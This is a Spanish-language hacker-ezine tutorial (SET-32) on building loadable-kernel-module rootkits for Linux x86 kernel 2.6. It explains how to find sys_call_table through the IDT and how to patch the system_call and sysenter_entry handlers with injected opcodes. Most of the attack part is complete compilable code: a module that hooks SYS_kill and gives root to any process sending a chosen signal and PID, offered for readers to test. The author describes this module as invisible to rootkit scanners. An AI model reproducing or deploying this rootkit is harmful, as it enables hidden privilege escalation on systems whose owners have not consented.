@@ -1,0 +1,919 @@
+-[ 0x10]---------------------------------------------------------------------
+-[ LKM Rootkits en Linux x86 v2.6]-------------------------------------------------------------
+-[ by raise ]--------------------------------------------------------SET-32--
+
+AUTOR: RaiSe <raise@enye-sec.org> - www.enye-sec.org
+
+
+------[ NOTA ]
+
+
+Este texto lo escribi hace algun tiempo ya, y algunas cosas han variado en
+los ultimos kernels. Muy poca cosa, pero el codigo en asm de system_call y
+sysenter_entry por ejemplo es un poco diferente, muy poco pero lo suficiente
+como para que el ejemplo de este texto de 'hookear' SYS_kill no funcione en
+kernels de la rama >= v2.6.10 aprox (no he mirado todas las versiones para
+ver en cual ha cambiado, en v2.6.3 funciona).
+
+Tambien comentar que el LKM Rootkit (eNYeLKM) al que me refiero en el texto
+ya esta desarrollado y va por la version v1.1. Esta disponible en
+www.enye-sec.org, y usa el metodo explicado en este texto. Ese LKM si
+funciona en los ultimos kernels, y tiene las cosas tipicas de un LKM Rootkit:
+ocultacion de ficheros directorios y procesos, acceso remoto con ocultacion
+de la conexion, etc.
+
+Si alguien lo prueba me gustaria que me hiciera llegar sus comentarios :).
+
+Un saludo a todos los lectores/as de SET.
+
+
+
+------[ 0.- Indice ]
+
+
+0.- Indice
+1.- Prologo
+2.- Historia de los LKM rootkits
+
+3.- Diferencias entre kernels v2.4 y v2.6
+  3.1.- Compilacion
+  3.2.- Simbolo sys_call_table
+
+4.- Modificacion del handler system_call
+5.- Modificacion del handler sysenter_entry
+
+6.- Ejemplo de LKM SYS_kill (root local) con handlers modificados
+7.- Despedida
+
+
+
+------[ 1.- Prologo ]
+
+
+Buenas. En este texto intentare explicar un poco las diferencias entre
+programar un LKM (loadable kernel module) para kernels de linux v2.4 y v2.6.
+Tambien hare un poco de repaso sobre la 'historia' de los LKM's rootkits, e
+introducire un nuevo metodo de instalar un LKM para hacerlo mas dificil de
+detectar.
+
+Este texto esta basado en LKM's para linux. Deberias estar minimamente
+familiarizado con la programacion de modulos para seguirlo, aunque tampoco
+intentare escribir una biblia sino un (mini)texto orientado a la practica.
+
+
+
+------[ 2.- Historia de los LKM rootkits ]
+
+
+Las ventajas de programar un rootkit en ring0 son muchas. Puedes hacer cosas
+como cambiar el contenido de la tabla de interrupciones, redireccionar
+syscalls, y en general cualquier cosa que se te ocurra ya que no tienes
+ningun limite de privilegios.
+
+Inicialmente los primeros LKM rootkits lo que hacian era modificar el
+contenido de la sys_call_table, de forma que las syscalls interesantes eran
+redireccionadas a nuestro codigo injectado en la memoria mediante el LKM.
+Esto permite cosas como dar root local, ocultar ficheros o procesos, etc. El
+problema de esto es que es muy facil para un detector de rootkits analizar la
+sys_call_table y darse cuenta de que ha sido modificada.
+
+Luego han ido apareciendo diferentes metodos para intentar hacer mas dificil
+la deteccion de rootkits. Por ejemplo insertando un salto en el principio de
+la syscall, o mediante mas o menos complejas tecnicas permitiendo ejecutar
+nuestro codigo bajo determinadas circunstancias. El problema de esto ultimo
+es que para lograr algunas de esas circunstancias hay que tener acceso al
+sistema (me estoy referiendo por ejemplo al metodo de generar un fallo de
+pagina -> http://www.phrack.org/show.php?p=61&a=7). Mas adelante veremos un
+metodo bastante sencillo que permite redireccionar syscalls sin modificar la
+sys_call_table ni la IDT (interrupt descriptor table).
+
+Pero empecemos por partes, viendo las diferencias entre los kernels v2.4 y
+v2.6.
+
+
+
+------[ 3.- Diferencias entre kernels v2.4 y v2.6 ]
+
+
+No voy a entrar en diferencias a bajo nivel porque: a) no las conozco en
+profundidad lo suficiente && b) no es necesario saberlas para programar un
+LKM. Me limitare a resumirlas y a centrarme en la parte practica.
+
+
+----[ 3.1.- Compilacion ]
+
+
+Bueno, de entrada la diferencia que salta a simple vista es la extension.
+Antes los modulos eran simples ficheros objeto (.o), ahora pasan a ser
+ficheros objecto de kernel (.ko). La forma de compilar un LKM tambien ha
+variado. Antes por ejemplo con tener un compilador y varios ficheros headers
+(.h) era suficiente. Ahora es necesario tener las fuentes del kernel (al
+menos una minima parte) instaladas en el sistema.
+
+Los ficheros .ko se compilan invocando el sistema de Makefiles del kernel.
+Esto es asi debido a que los LKM en v2.6 llevan ciertos simbolos definidos en
+tiempo de compilacion (explicacion sencilla). Para compilar por ejemplo un
+modulo que hace un printk("hola") seria algo como lo siguiente:
+
+NOTA: Hay que tener cuidado con que herramienta se copia y se pega el codigo 
+      del Makefile, ya que tiene que copiar correctamente los tabuladores, si 
+      los convierte en espacios no funcionara.
+
+
+---- ejemplo.c ----
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+
+
+int init_module(void)
+{
+printk("weee!\n");
+
+return(0);
+}
+
+void cleanup_module(void)
+{
+}
+
+MODULE_LICENSE("GPL");
+
+---- eof ----
+
+
+---- Makefile ----
+
+obj-m := ejemplo.o
+
+all:
+	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
+
+---- eof ----
+
+
+En /lib/modules/$(shell uname -r)/ logicamente hay que tener un enlace con el
+nombre de build apuntando al directorio de las fuentes del kernel (ya viene
+instalado en un sistema bien configurado). Pues nada, ponemos 'make' y ya
+tenemos el 'ejemplo.ko' listo para instalarlo.
+
+
+----[ 3.2.- Simbolo sys_call_table ]
+
+
+Otra diferencia en los kernels v2.6 es que el valor de la sys_call_table ya
+no se exporta como simbolo del kernel. Antes en v2.4 para obtener la
+direccion de la sys_call_table bastaba con algo como:
+
+extern void *sys_call_table[];
+
+En v2.6 la cosa es un poco mas complicada (pero poco). Hay varios metodos
+para conseguir la direccion de la tabla de syscalls. La mas sencilla (y la
+mas cutre) es mirar el fichero System.map, pero ese fichero puede no estar
+actualizado, haber sido modificado, etc. Por lo tanto lo mejor es usar otro
+metodo que la 'saque' de la memoria en tiempo de ejecucion. El metodo que uso
+solo sirve para Linux x86 (como casi todo lo que explica este texto), y no es
+idea mia sino que es usado en muchos LKMs.
+
+Consiste en sacar la direccion del propio handler que linux usa para la
+interrupcion 0x80. Como sabreis las syscalls en linux se utilizan a traves de
+la interrupcion 0x80, colocando en %eax el numero de la syscall y en %ebx,
+%ecx, etc. los argumentos de la misma. El handler de dicha interrupcion
+(0x80) es 'system_call', y esta definida asi en 'arch/i386/kernel/entry.S' en
+las fuentes del kernel:
+
+
+---- arch/i386/kernel/entry.S ----
+
+    # system call handler stub
+ENTRY(system_call)
+    pushl %eax          # save orig_eax
+    SAVE_ALL
+    GET_THREAD_INFO(%ebp)
+    cmpl $(nr_syscalls), %eax
+    jae syscall_badsys
+                    # system call tracing in operation
+    testb $_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp)
+    jnz syscall_trace_entry
+syscall_call:
+    call *sys_call_table(,%eax,4)
+    movl %eax,EAX(%esp)     # store the return value
+    ....
+
+---- eof ----
+
+
+Como vemos primero salva todos los registros en la pila, luego hace unas
+cuantas comprobaciones como por ejemplo si el numero de syscall es correcto,
+y lo que nos interesa: hace un call *sys_call_table(,%eax,4). O sea que en
+esa propia instruccion del call va incluida la direccion de la
+sys_call_table, es decir los opcodes de esa instruccion serian algo como:
+
+ 0xff 0x14 0x85 *direcion de sys_call_table*
+
+Los 3 primeros corresponden a la instruccion del call. Resumiendo, lo que
+tenemos que hacer es conseguir la direccion del handler de int 0x80
+(system_call), e ir mirando hasta que encontremos 0xff 0x14 0x85. Ahora bien,
+como conseguimos la direccion del handler?. Muy sencillo, a traves de la IDT
+(Interrupt Descriptor Table). La IDT contiene descriptores para cada
+interrupcion (entre otras cosas). La direccion de la IDT esta contenido en el
+registro IDTR, de 48 bits, que tiene la siguiente pinta:
+
+
+     47                                  15             0
+     |     Direccion Base IDT            |   IDT Limit  |  
+
+
+Es decir, los primeros 2 bytes son el limite de la IDT, y los 4 siguientes la
+direccion base. El contenido del IDTR se lee con la istruccion especial
+'sidt'. Una vez tengamos la direccion base de IDT nos vamos al descriptor
+0x80. Los descriptores ocupan 64 bits cada uno y tienen la siguiente pinta
+(lo pongo en estilo C para que sea mas breve):
+
+ struct idt_descriptor
+     {
+     unsigned short off_low;
+     unsigned short sel;
+     unsigned char none, flags;
+     unsigned short off_high;
+     };
+
+O sea, los primeros 2 bytes y los 2 ultimos corresponden a la parte baja y a
+la parte alta del offset respectivamente, hay que 'cogerlos' para unirlos y
+obtener la direccion base del handler (system_call). Todo este rollo resumido
+en C seria tal que asi (modulo entero que printea el valor de la
+sys_call_table):
+
+
+---- print_sys_call_table.c ----
+
+#include <linux/types.h>
+#include <linux/stddef.h>
+#include <linux/unistd.h>
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/kernel.h>
+#include <linux/string.h>
+#include <linux/mm.h>
+#include <linux/slab.h>
+#include <linux/sched.h>
+#include <linux/in.h>
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+#include <linux/dirent.h>
+#include <asm/processor.h>
+#include <asm/uaccess.h>
+#include <asm/unistd.h>
+
+
+void *get_system_call(void);
+void *get_sys_call_table(void *system_call);
+
+void **sys_call_table;
+     
+struct idt_descriptor
+    {
+    unsigned short off_low;
+    unsigned short sel;
+    unsigned char none, flags;
+    unsigned short off_high;
+    };
+
+
+int init_module(void)
+{
+void *s_call;
+
+s_call = get_system_call();
+sys_call_table = get_sys_call_table(s_call);
+
+printk("sys_call_table: 0x%08x\n", (int) sys_call_table);
+return(-1);
+}
+
+void cleanup_module(void) { /* nada */ }
+
+
+void *get_system_call(void)
+{
+unsigned char idtr[6];
+unsigned long base;
+struct idt_descriptor desc;
+
+asm ("sidt %0" : "=m" (idtr));
+base = *((unsigned long *) &idtr[2]);
+memcpy(&desc, (void *) (base + (0x80*8)), sizeof(desc));
+
+return((void *) ((desc.off_high << 16) + desc.off_low));
+
+} /*********** fin get_sys_call_table() ***********/
+
+
+void *get_sys_call_table(void *system_call)
+{
+unsigned char *p;
+unsigned long s_c_t;
+int count = 0;
+
+p = (unsigned char *) system_call;
+
+while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
+    {
+    p++;
+
+    if (count++ > 500)
+        {
+        count = -1;
+        break;
+        }
+    }
+
+if (count != -1)
+    {
+    p += 3;
+    s_c_t = *((unsigned long *) p);
+    }
+else
+    s_c_t = 0;
+
+return((void *) s_c_t);
+
+} /********** fin get_sys_call_table() *************/
+
+MODULE_LICENSE("GPL");
+
+---- eof ----
+
+
+Lo compilamos con el Makefile correspondiente (seccion 3.1 del texto, solo
+hay que cambiar ejemplo.o por print_sys_call_table.o), lo instalamos (dara un
+error por el return -1, solo es para ver lo que printea) y miramos el syslog:
+
+Sep 25 01:19:58 enye-sec kernel: sys_call_table: 0xc0323d00
+
+Y ahora hacemos:
+
+[raise@enye-sec]$ grep sys_call_table /boot/System.map
+c0323d00 D sys_call_table
+
+Como vemos coincide perfectamente o sea que el metodo funciona.
+
+
+
+------[ 4.- Modificacion del handler system_call ]
+
+
+Ahora veremos un metodo para conseguir redireccionar todas las syscalls que
+queramos, pero sin tocar ni el contenido de la sys_call_table, ni el codigo
+de ninguna syscall, ni la IDT. Como?, muy sencillo, modificando ciertos bytes
+del handler de int 0x80, usease de system_call. Esto permite manejar nuestras
+propias syscalls sin que ningun scanner de rootkits (al menos hasta la fecha
+y que yo conozca) lo detecte.
+
+El metodo que usaremos es bastante simple. Repasemos el codigo en asm de
+system_call:
+
+
+---- arch/i386/kernel/entry.S ----
+
+    # system call handler stub
+ENTRY(system_call)
+    pushl %eax          # save orig_eax
+    SAVE_ALL
+    GET_THREAD_INFO(%ebp)
+
+    cmpl $(nr_syscalls), %eax    --->  Estas instrucciones seran las que 
+    jae syscall_badsys           --->  sobreescribiremos con nuestro salto. 
+
+                    # system call tracing in operation
+    testb $_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp)
+    jnz syscall_trace_entry
+syscall_call:
+    call *sys_call_table(,%eax,4)
+    movl %eax,EAX(%esp)     # store the return value
+    ....
+
+---- eof ----
+
+
+Analicemos. Necesitamos meter un salto; el mejor sitio para hacerlo segun mi
+opinion es cargarse justo lo que hay entre GET_THREAD_INFO(%ebp) y testb
+$_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp). Es decir, la comparacion y el salto a
+syscall_badsys. $(nr_syscalls) no es mas que ... para ser exactos:
+
+#define nr_syscalls ((syscall_table_size)/4)
+
+Usease, compara si la syscall es mayor que el numero de syscall maximo
+permitido (0x112). El 'cmpl $(nr_syscalls), %eax' ocupa 5 bytes, y el 'jae
+syscall_badsys' ocupa 6, con lo cual tenemos 11 bytes para meter ahi nuestro
+salto. La forma mas sencilla de hacerlo es sobreescribiendo un 'pushl' con
+nuestra direccion y luego un 'ret', que ocupan 6 bytes en total. Esto lo
+haremos justo donde comienza el 'cmpl'.
+
+Una vez que tengamos el control del sistema (cuando algun programa use la int
+0x80) haremos la comparacion entre %eax y nr_syscalls nosotros mismos, y si
+el numero de syscall se pasa del permitido (0x112) saltaremos a
+syscall_badsys justo como haria el handler original. Seguimos..
+
+Suponemos que el resultado es valido, lo siguiente es comprobar la syscall
+con todas las syscalls que queremos redireccionador. Por ejemplo, si queremos
+redireccionar la syscall de SYS_kill (numero 37), comparamos %eax con 37, si
+son iguales saltamos a nuestra propia syscall (codigo en el modulo), y sino
+saltamos justo al handler original al 'testb $_TIF_SYSCALL_TRACE,
+TI_FLAGS(%ebp)'. Con lo cual tenemos un salto intermedio en el que comparamos
+%eax primero con nr_syscalls y luego con nuestra syscall favorita.
+
+En caso de que no sea la syscall que buscamos devolvemos el control al
+handler como si no hubiera pasado nada, pero en el caso de que lo sea ya
+tenemos el control y en nuestro propio codigo podemos manejar la syscall a
+nuestro antojo, y desde ahi llamar a la syscall original como se hace con los
+LKMs clasicos de toda la vida.
+
+No os preocupeis si os perdeis con tanta explicacion teorica, al final del
+texto va incluido un LKM que usa este metodo para redireccionar la syscall
+SYS_kill, que podeis usar para mirar como va todo detalladamente.
+
+
+
+------[ 5.- Modificacion del handler sysenter_entry ]
+
+
+El metodo de sobreescribir el handler de la interrupcion 0x80 tiene un
+inconveniente. Y es que, mas o menos desde el kernel 2.6, en combinacion con
+libc ya no se usa int 0x80 para llamar a las syscalls, sino que se usa una
+instruccion especial llamada 'sysenter' (2 bytes: 0x0f 0x34), que lo que hace
+es llamar a la funcion 'sysenter_entry'. Dicha funcion/handler lo que hace es
+practicamente lo mismo que 'system_call', pero sin tener que pasar por la
+IDT, con el consiguiente ahorro de tiempo. Es decir, todos los programas que
+usan libc no llaman a la interrupcion 0x80 para ejecutar una syscall, sino
+que lo hacen a traves de sysenter, con lo que el metodo de la seccion
+anterior de este texto queda incompleto.
+
+Hechemos un vistazo a la funcion sysenter_entry:
+
+
+---- arch/i386/kernel/entry.S ----
+
+    # sysenter call handler stub
+ENTRY(sysenter_entry)
+    movl TSS_ESP0_OFFSET(%esp),%esp
+sysenter_past_esp:
+    sti
+    pushl $(__USER_DS)
+    pushl %ebp
+    pushfl
+    pushl $(__USER_CS)
+    pushl $SYSENTER_RETURN
+
+/*
+ * Load the potential sixth argument from user stack.
+ * Careful about security.
+ */
+    cmpl $__PAGE_OFFSET-3,%ebp
+    jae syscall_fault
+1:  movl (%ebp),%ebp
+.section __ex_table,"a"
+    .align 4
+    .long 1b,syscall_fault
+.previous
+
+    pushl %eax
+    SAVE_ALL
+    GET_THREAD_INFO(%ebp)
+    cmpl $(nr_syscalls), %eax    --->  Estas instrucciones seran las que
+    jae syscall_badsys           --->  sobreescribiremos con nuestro salto.
+
+    testb $_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp)
+    jnz syscall_trace_entry
+    call *sys_call_table(,%eax,4)
+    movl %eax,EAX(%esp)
+    ....
+
+---- eof ----
+
+
+Como vemos el funcionamiento interno es el mismo, al final termina saltando
+al puntero contenido en sys_call_table: 'call *sys_call_table(,%eax,4)'. En
+realidad el codigo a partir de cuando salva los registros en la pila es una
+copia exacta del handler de la int 0x80 (system_call). Por lo tanto no
+tenemos mas que aplicar el mismo metodo para este otro handler, es decir
+meter un salto justo en la comparacion de %eax con nr_syscalls.
+
+La diferencia esta en como sacamos la direccion de sysenter_entry. A
+diferencia de sys_call_table, sysenter_entry si que esta exportado como
+simbolo, con lo que podemos sacarlo por ejemplo con un sencillo:
+
+[raise@enye-sec]$ grep sysenter_entry /proc/kallsyms
+c010af50 t sysenter_entry
+
+De todas formas tiene que haber una forma de leer el simbolo desde el propio
+LKM. Lo he estado mirando y debo ser muy burro porque fui incapaz de
+conseguirlo con las funciones para leer simbolos del kernel.. si alguien sabe
+como hacerlo le agradeceria que me enviara un email a raise@enye-sec.org. El
+metodo que uso en el LKM es leer el simbolo desde el propio Makefile con un
+script, pero aunque funciona la verdad es que no queda muy bonito que se
+diga.
+
+
+
+------[ 6.- LKM SYS_kill (root local) con handlers modificados ]
+
+
+Aqui teneis un sencillo ejemplo de como aplicar el metodo de modificar los
+handlers system_call y sysenter_entry, consiguiendo redireccionar la SYS_kill
+y obteniendo un rootkit que proporciona root local, todo ello sin que ningun
+(hasta la fecha) scanner de rootkits lo detecte. Pero antes de copy & paste
+del codigo vamos a explicar muy brevemente su funcionamiento.
+
+El rootkit mete un par de saltos, segun el metodo explicado, tanto en el
+handler de int 0x80 (system_call) como en el de sysenter (sysenter_entry).
+Esos saltos van a los arrays con instrucciones en asm correspondientes
+definidos en el LKM: idt_handler[] y sysenter_handler[].
+
+Los codigos son exactamente iguales. Ambos se rellenaran en tiempo de carga
+del LKM con algunos valores sobreescribiendo ciertos bytes de esos arrays,
+como por ejemplo la direccion de salto en caso de que el numero de syscall
+sea incorrecto, etc. El codigo de esos arrays es el siguiente:
+
+char idt_handler[]= // (el sysenter_handler es identico)
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x3d\x12\x01\x00\x00\x73\x02"
+    "\xeb\x06\x68\x90\x90\x90\x90\xc3\x83\xf8\x25\x74\x06\x68\x90\x90"
+    "\x90\x90\xc3\xff\x15\x90\x90\x90\x90\x68\x90\x90\x90\x90\xc3";
+
+
+Analicemos los opcodes..
+
+
+* "\x90\x90\x90\x90\x90\x90\x90\x90\x90":
+- 9 nops, nosotros por motivos de seguridad saltaremos al quinto nop
+  justamente (salto desde el handler original).
+
+* "\x3d\x12\x01\x00\x00" = 'cmp $0x112,%eax' :
+- Hacemos la comparacion que deberia hacer el handler.
+
+* "\x73\x02" = 'jae +2' :
+- Si es igual o mayor salta la siguiente instruccion (el jmp siguiente).
+
+* "\xeb\x06" = 'jmp +6' :
+- Salta las 2 siguientes instrucciones (el push+ret).
+
+* "\x68\x90\x90\x90\x90\xc3" = 'pushl 0x90909090' 'ret' :
+- Aqui sobreescribiremos 0x90909090 por la direccion original de
+  syscall_badsys en el handler.
+
+* "\x83\xf8\x25" = 'cmp $0x25,%eax' :
+- Comprobacion que hacemos para ver si la syscall llamada es SYS_kill (0x25).
+  
+* "\x74\x06" = 'je +6' :
+- Si lo es nos saltamos las 2 siguientes instrucciones (push+ret).
+
+* "\x68\x90\x90\x90\x90\xc3" = 'pushl 0x90909090' 'ret' :
+- Aqui sobreescribiremos con la direccion del 'testb $_TIF_SYSCALL_TRACE,
+  TI_FLAGS(%ebp)' original del handler (un valor para cada handler), ya que
+  la syscall no es SYS_kill y no nos interesa, asi que le devolvemos el
+  control al handler.
+
+* "\xff\x15\x90\x90\x90\x90" = 'call *0x90909090' :
+- Aqui la syscall SI es SYS_kill, asi que necesitamos saltar a nuestra
+  funcion hacked_kill(), pero retornando luego justo aqui, o sea que tiene
+  que ser con un call. Un call normal toma el argumento como offset, no como
+  direccion de memoria absoluta, asi que para no complicarnos la vida usamos
+  una variable intermedia que si contiene la direccion de hacked_kill():
+  p_hacked_kill (nota: un call usando una direccion intermedia si que toma el
+  contenido de dicha direccion como memoria absoluta). Dicha variable es
+  declarada en el LKM, y sobreescribremos 0x90909090 en esta instruccion del
+  handler por la direccion de dicha variable (p_hacked_kill), con lo que el
+  call finalmente saltara a hacked_kill().
+
+* "\x68\x90\x90\x90\x90\xc3" = 'pushl 0x90909090' 'ret' :
+- Despues de haber ejecutado nuestra propia syscall 'hackeada' hay que
+  devolver el control al sistema, o sea que sobreescribremos 0x90909090 por
+  la instruccion siguiente al 'call *sys_call_table(,%eax,4)' del handler
+  original, como si en realidad hubiese sido el handler el que hubiera
+  llamado a la syscall.
+
+* Finish :).
+
+
+Espero haberlo explicado mas o menos bien.. Abajo teneis el codigo completo
+del LKM para que podais probarlo si quereis. No he puesto funcion de
+desinstalacion por vagancia, asi que la unica forma de desinstalarlo es
+haciendo 1 reset al sistema.
+
+
+NOTA: Hay que tener cuidado con que herramienta se copia y se pega el codigo 
+      del Makefile, ya que tiene que copiar correctamente los tabuladores, si 
+      los convierte en espacios no funcionara.
+
+
+---- Makefile ----
+
+obj-m := ejemplo_handlers_syskill.o
+S_ENT = 0x`grep sysenter_entry /proc/kallsyms | head -c 8`
+
+all:
+	@echo
+	@echo "------------------------------------------"
+	@echo " LKM (SYS_kill) con handlers modificados"
+	@echo " raise@enye-sec.org | www.enye-sec.org"
+	@echo "------------------------------------------"
+	@echo
+	@echo "#define DSYSENTER $(S_ENT)" > sysenter.h
+	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
+
+clean:
+	@echo
+	@echo "------------------------------------------"
+	@echo " LKM (SYS_kill) con handlers modificados"
+	@echo " raise@enye-sec.org | www.enye-sec.org"
+	@echo "------------------------------------------"
+	@echo
+	@rm -f *.o *.ko *.mod.c .*.cmd sysenter.h
+	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean
+
+---- eof ----
+
+
+---- ejemplo_handlers_syskill.c ----
+
+/*
+ * Ejemplo de LKM x86 kernel 2.6.x modificando los handlers de:
+ *
+ *  - system_call
+ *  - sysenter_entry
+ *
+ * Una vez cargado para conseguir root local ejecutar:
+ *
+ * # kill -s SIG PID
+ *
+ * SIG y PID se pueden cambiar variando los #define
+ *
+ *
+ * RaiSe <raise@enye-sec.org>
+ * eNYe Sec - http://www.enye-sec.org
+ *
+ */
+ 
+
+#include <linux/types.h>
+#include <linux/stddef.h>
+#include <linux/unistd.h>
+#include <linux/config.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/kernel.h>
+#include <linux/string.h>
+#include <linux/mm.h>
+#include <linux/slab.h>
+#include <linux/sched.h>
+#include <linux/in.h>
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+#include <linux/dirent.h>
+#include <asm/processor.h>
+#include <asm/uaccess.h>
+#include <asm/unistd.h>
+#include "sysenter.h"
+
+#define IDT 0
+#define SYSENT 1
+#define ORIG_BADSYS 19
+#define TESTTRACE 30
+#define SALTO 5
+#define DCALL 37
+#define DAFTER_CALL 42
+
+#define SIG 58
+#define PID 12345
+
+
+/* punteros a syscalls originales */
+int (*orig_kill)(pid_t pid, int sig);
+
+
+/* variables globales */
+unsigned long orig_bad_sys[2], test_trace[2];
+unsigned long after_call[2], p_hacked_kill;
+void *sysenter_entry;
+void **sys_call_table;
+
+
+/* prototipos funciones */
+void *get_system_call(void);
+void *get_sys_call_table(void *system_call);
+void set_idt_handler(void *system_call);
+void set_sysenter_handler(void *sysenter);
+int hacked_kill(pid_t pid, int sig);
+
+
+/* estructuras */
+struct idt_descriptor
+	{
+	unsigned short off_low;
+	unsigned short sel;
+	unsigned char none, flags;
+	unsigned short off_high;
+	};
+
+
+/* handlers */
+char idt_handler[]=
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x3d\x12\x01\x00\x00\x73\x02"
+    "\xeb\x06\x68\x90\x90\x90\x90\xc3\x83\xf8\x25\x74\x06\x68\x90\x90"
+    "\x90\x90\xc3\xff\x15\x90\x90\x90\x90\x68\x90\x90\x90\x90\xc3";
+
+char sysenter_handler[]=
+    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x3d\x12\x01\x00\x00\x73\x02"
+    "\xeb\x06\x68\x90\x90\x90\x90\xc3\x83\xf8\x25\x74\x06\x68\x90\x90"
+    "\x90\x90\xc3\xff\x15\x90\x90\x90\x90\x68\x90\x90\x90\x90\xc3";
+
+
+
+int init_module(void)
+{
+void *s_call;
+
+sysenter_entry = (void *) DSYSENTER;
+
+s_call = get_system_call();
+sys_call_table = get_sys_call_table(s_call);
+set_idt_handler(s_call);
+set_sysenter_handler(sysenter_entry);
+
+p_hacked_kill = (unsigned long) hacked_kill;
+
+orig_kill = sys_call_table[__NR_kill];
+
+return(0);
+}
+
+
+void cleanup_module(void)
+{
+}
+
+
+void *get_system_call(void)
+{
+unsigned char idtr[6];
+unsigned long base;
+struct idt_descriptor desc;
+
+asm ("sidt %0" : "=m" (idtr));
+base = *((unsigned long *) &idtr[2]);
+memcpy(&desc, (void *) (base + (0x80*8)), sizeof(desc));
+
+return((void *) ((desc.off_high << 16) + desc.off_low)); 
+
+} /*********** fin get_sys_call_table() ***********/
+
+
+
+void *get_sys_call_table(void *system_call)
+{
+unsigned char *p;
+unsigned long s_c_t;
+
+p = (unsigned char *) system_call;
+
+while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
+	p++;
+
+p += 3;
+s_c_t = *((unsigned long *) p);
+
+p += 4;
+after_call[IDT] = (unsigned long) p;
+
+return((void *) s_c_t);
+
+} /********** fin get_sys_call_table() *************/
+
+
+
+void set_idt_handler(void *system_call)
+{
+unsigned char *p;
+unsigned long offset, *p2;
+
+p = (unsigned char *) system_call;
+
+while (!((*p == 0x0f) && (*(p+1) == 0x83)))
+    p++;
+
+p += 2;
+offset = *((unsigned long *) p);
+
+orig_bad_sys[IDT] = (unsigned long)((p-2) + offset + 6);
+test_trace[IDT] = (unsigned long)((p-2) + 6);
+
+p = (unsigned char *)(test_trace[IDT] - 0xb);
+
+*p++ = 0x68;
+p2 = (unsigned long *) p;
+*p2++ = (unsigned long) ((void *) &idt_handler[SALTO]);
+
+p = (unsigned char *) p2;
+*p = 0xc3;
+
+p = idt_handler;
+*((unsigned long *)((void *) p+ORIG_BADSYS)) = orig_bad_sys[IDT];
+*((unsigned long *)((void *) p+TESTTRACE)) = test_trace[IDT];
+*((unsigned long *)((void *) p+DCALL)) = (unsigned long) &p_hacked_kill;
+*((unsigned long *)((void *) p+DAFTER_CALL)) = after_call[IDT];
+
+} /********** fin set_idt_handler() ***********/
+
+
+
+void set_sysenter_handler(void *sysenter)
+{
+unsigned char *p;
+unsigned long *p2;
+
+p = (unsigned char *) sysenter;
+
+while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
+    p++;
+
+p += 7;
+after_call[SYSENT] = (unsigned long) p;
+
+p = (unsigned char *) sysenter;
+
+while (!((*p == 0x3d) && (*(p+1) == 0x12) && (*(p+2) == 0x01)
+		 && (*(p+3) == 0x00)))
+    p++;
+
+p += 11;
+
+orig_bad_sys[SYSENT] = orig_bad_sys[IDT];
+test_trace[SYSENT] = (unsigned long)(p);
+
+p = (unsigned char *)(test_trace[SYSENT] - 0xb);
+
+*p++ = 0x68;
+p2 = (unsigned long *) p;
+*p2++ = (unsigned long) ((void *) &sysenter_handler[SALTO]);
+
+p = (unsigned char *) p2;
+*p = 0xc3;
+
+p = sysenter_handler;
+*((unsigned long *)((void *) p+ORIG_BADSYS)) = orig_bad_sys[SYSENT];
+*((unsigned long *)((void *) p+TESTTRACE)) = test_trace[SYSENT];
+*((unsigned long *)((void *) p+DCALL)) = (unsigned long) &p_hacked_kill;
+*((unsigned long *)((void *) p+DAFTER_CALL)) = after_call[SYSENT];
+
+} /********** fin set_sysenter_handler() ***********/
+
+
+
+int hacked_kill(pid_t pid, int sig)
+{
+struct task_struct *ptr = current;
+int tsig = SIG, tpid = PID, ret_tmp;
+
+
+if ((tpid == pid) && (tsig == sig))
+    {
+    ptr->uid = 0;
+    ptr->euid = 0;
+    ptr->gid = 0;
+    ptr->egid = 0;
+    return(0);
+    }
+else
+    {
+    ret_tmp = (*orig_kill)(pid, sig);
+    return(ret_tmp);
+    }
+
+return(-1);
+
+} /********** fin hacked_kill ************/
+
+
+/* Licencia GPL */
+MODULE_LICENSE("GPL");
+
+---- eof ----
+
+
+
+------[ 7.- Despedida ]
+
+
+Espero haber ayudado a aclarar un poco como programar un LKM en linux con
+kernels v2.6. Tambien espero que el metodo de modificar los handlers os sea
+util. En breve publicare en http://www.enye-sec.org un LKM Rootkit bastante
+completo que no solo redireccione SYS_kill, y que haga cosas como
+auto_ocultarse a la lista de modulos cargados, etc.
+
+Un saludo :).
+
+RaiSe <raise@enye-sec.org>
+
+*EOF*
